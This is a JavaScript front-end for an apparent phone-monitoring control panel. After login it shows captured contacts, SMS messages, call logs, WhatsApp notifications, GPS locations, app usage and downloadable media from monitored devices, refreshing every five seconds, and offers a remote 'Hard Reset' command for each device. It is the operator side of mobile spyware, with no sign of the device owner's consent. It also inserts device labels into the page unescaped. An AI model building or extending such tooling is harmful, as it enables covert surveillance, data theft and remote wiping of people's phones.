const API_BASE = '/api';
const tokenKey = 'monitor_jwt';
const userKey = 'monitor_user';

const api = {
  post: async (path, body, token) => {
    const res = await fetch(API_BASE + path, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', ...(token?{ Authorization: 'Bearer ' + token }: {}) },
      body: JSON.stringify(body)
    });
    return res.json();
  },
  get: async (path, token) => {
    const res = await fetch(API_BASE + path, {
      headers: { ...(token?{ Authorization: 'Bearer ' + token }: {}) }
    });
    if (!res.ok) {
      return [];
    }
    return res.json();
  },
  download: async (path, token) => {
    const res = await fetch(API_BASE + path, { headers: { Authorization: 'Bearer ' + token }});
    if (!res.ok) throw new Error('download failed');
    return res.blob();
  }
};

function setLoggedIn(user, token) {
  localStorage.setItem(tokenKey, token);
  localStorage.setItem(userKey, JSON.stringify(user));
}

function logout() {
  localStorage.removeItem(tokenKey);
  localStorage.removeItem(userKey);
  location.reload();
}

function getToken() { return localStorage.getItem(tokenKey); }
function getUser() { return JSON.parse(localStorage.getItem(userKey) || 'null'); }

document.getElementById('btnLogin').addEventListener('click', async () => {
  const u = document.getElementById('username').value;
  const p = document.getElementById('password').value;
  const r = await api.post('/auth/login', { username: u, password: p });
  if (r.token) {
    setLoggedIn(r.user, r.token);
    showDashboard();
  } else {
    document.getElementById('loginMsg').innerText = r.error || 'Login failed';
  }
});

document.getElementById('btnRegister').addEventListener('click', async () => {
  const u = document.getElementById('username').value;
  const p = document.getElementById('password').value;
  const r = await api.post('/auth/register', { username: u, password: p });
  if (r.ok) {
    document.getElementById('loginMsg').innerText = 'Registered, now login';
  } else {
    document.getElementById('loginMsg').innerText = r.error || 'Register failed';
  }
});

document.getElementById('btnLogout').addEventListener('click', logout);

function isDeviceOnline(lastSeen, thresholdSeconds = 120) {
  if (!lastSeen) return false;
  const diff = Date.now() - (new Date(lastSeen)).getTime();
  return diff <= (thresholdSeconds * 1000);
}

async function renderDevices() {
  const token = getToken();
  if (!token) return;
  const res = await api.get('/devices', token);
  const container = document.getElementById('devicesList');
  container.innerHTML = '';
  if (!res || res.length === 0) {
    container.innerHTML = '<div>Nenhum dispositivo registado</div>'; return;
  }
  res.forEach(d => {
    const el = document.createElement('div');
    el.className = 'device';
    const label = d.label || d.deviceId;
    const online = isDeviceOnline(d.lastSeen);
    el.innerHTML = `<div><strong>${label}</strong><div>LastSeen: ${d.lastSeen ? new Date(d.lastSeen).toLocaleString() : 'never'}</div></div>
      <div style="display:flex;align-items:center;">
        <span style="color:${online?'green':'red'};font-weight:bold;margin-right:8px;">●</span>
        <button onclick="sendCmd('${d.deviceId}','HARD_RESET')">Hard Reset</button>
      </div>`;
    container.appendChild(el);
  });
}

async function sendCmd(deviceId, command) {
  const token = getToken();
  if (!token) return alert('Not authenticated');
  const res = await api.post('/device/' + encodeURIComponent(deviceId) + '/command', { command }, token);
  if (res && res.ok) alert('Command sent'); else alert('Command failed');
}

async function render() {
  const token = getToken();
  if (!token) return;
  const user = getUser();
  document.getElementById('userName').innerText = user ? user.username : 'unknown';

  await renderDevices();

  const contacts = await api.get('/contacts', token);
  const contactsList = document.getElementById('contactsList'); contactsList.innerHTML = '';
  if (contacts && contacts.length) {
    contacts.forEach(c => { const li = document.createElement('li'); li.textContent = `${c.name} — ${c.number}`; contactsList.appendChild(li); });
  } else contactsList.innerHTML = '<li>Sem contactos</li>';

  const sms = await api.get('/sms', token);
  const smsList = document.getElementById('smsList'); smsList.innerHTML = '';
  sms.forEach(s => { const li = document.createElement('li'); li.textContent = `${s.sender}: ${s.message} (${new Date(s.timestamp).toLocaleString()})`; smsList.appendChild(li); });

  const calls = await api.get('/call', token);
  const callsList = document.getElementById('callsList'); callsList.innerHTML = '';
  calls.forEach(c => { const li = document.createElement('li'); li.textContent = `${c.number||'unknown'} - ${c.state} (${new Date(c.timestamp).toLocaleString()})`; callsList.appendChild(li); });

  const notifs = await api.get('/whatsapp', token);
  const notifList = document.getElementById('notifList'); notifList.innerHTML = '';
  notifs.forEach(n => { const li = document.createElement('li'); li.textContent = `${n.sender || n.packageName}: ${n.message} (${new Date(n.timestamp).toLocaleString()})`; notifList.appendChild(li); });

  const locs = await api.get('/location', token);
  const locList = document.getElementById('locList'); locList.innerHTML = '';
  locs.forEach(l => { const li = document.createElement('li'); li.textContent = `${l.lat.toFixed(5)}, ${l.lon.toFixed(5)} (${l.accuracy}) - ${new Date(l.timestamp).toLocaleString()}`; locList.appendChild(li); });

  const usage = await api.get('/app-usage', token);
  const usageList = document.getElementById('usageList'); usageList.innerHTML = '';
  usage.forEach(u => { const li = document.createElement('li'); li.textContent = `${u.packageName}: ${u.totalTime}ms (last ${new Date(u.lastTimeUsed).toLocaleString()})`; usageList.appendChild(li); });

  const media = await api.get('/media', token);
  const mediaList = document.getElementById('mediaList'); mediaList.innerHTML = '';
  media.forEach(m => {
    const li = document.createElement('li');
    const btn = document.createElement('button');
    btn.textContent = 'Download';
    btn.onclick = async () => {
      try {
        const blob = await api.download('/media/' + m._id, token);
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url; a.download = m.filename || 'file';
        document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url);
      } catch (e) { alert('Download failed'); }
    };
    li.appendChild(document.createTextNode((m.filename || m._id) + ' '));
    li.appendChild(btn);
    mediaList.appendChild(li);
  });
}

function showDashboard() {
  document.getElementById('loginBox').classList.add('hidden');
  document.getElementById('dashboard').classList.remove('hidden');
  render();
  setInterval(render, 5000);
}

window.addEventListener('load', () => {
  if (getToken()) showDashboard();
});
